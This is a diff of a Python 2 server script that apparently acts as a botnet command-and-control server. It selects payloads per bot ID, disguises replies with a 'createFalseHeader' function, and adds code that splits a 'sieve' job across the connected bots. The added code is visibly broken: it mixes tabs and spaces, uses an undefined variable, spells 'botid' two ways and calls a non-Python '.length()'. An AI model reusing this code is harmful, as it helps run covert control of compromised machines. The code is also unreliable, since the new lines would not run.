@@ -185,6 +185,18 @@ def communicate(conn, address, payloadProxy, BOTS, finished):
                         p = checkIfIsTarget(botId, payloads)
                     if p != '':
                         logging.debug("Payload selected: " + p.ID)
+                        if "XYZ12" in p:#this is sieve payload
+							for line in p.split('\n'):
+								#grab lines
+								#look for n = int
+								#then index into it by BOTID
+								#then put proper values for top/bottom of the partition
+								if "n = " not in line:
+									continue
+								topofsieve = line.split(' ')[2]
+								index = BOTS.values().index(botid)
+								partitionint = int(n/BOTS.values().length())
+								p.append("\ntlow = {}\nthigh = {}\n".format(partitionint*index, (index+1)*partitionint-1))
                         full_command = genCommandFromPayload(p)
                         response = createFalseHeader(len(full_command), full_command)
                         logging.debug("Sending Response: " + response)
@@ -236,7 +248,7 @@ def executeCommand(command, payloadProxy, finished, BOTS):
     com = tokens[0]
     args = tokens[1]
     
-    if com == 'l':
+    if com == 'l':#modify stuff here for "self-modifying" code
         args = args.split(' ')
         fname = args[0]
         p = Payload()
@@ -272,6 +284,7 @@ def commandHandler(payloadList, finishedList, BOTS):
             executeCommand(cmd, payloadList, finishedList, BOTS)
         except Exception, e:
             logging.info("Failed Executing Command: " + str(e))
+
 message_lock = Lock()
 
 def sendToGUI(message):
@@ -297,7 +310,7 @@ def main():
     cmd_thread.start()
     while True:
         try:
-            cmd = raw_input('Please input next command (\'help\' for help): ')
+            cmd = raw_input("Please input next command ('help' for help): ")
         except Exception, e:
             logging.info("Invalid input: " + str(e))
             break
@@ -318,6 +331,7 @@ def main():
         except:
             continue
     shutdownGracefully()
+
 if __name__ == "__main__":
     signal.signal(signal.SIGINT, signal_handler)
     logging.basicConfig(filename='serverLog.log',level=logging.DEBUG)
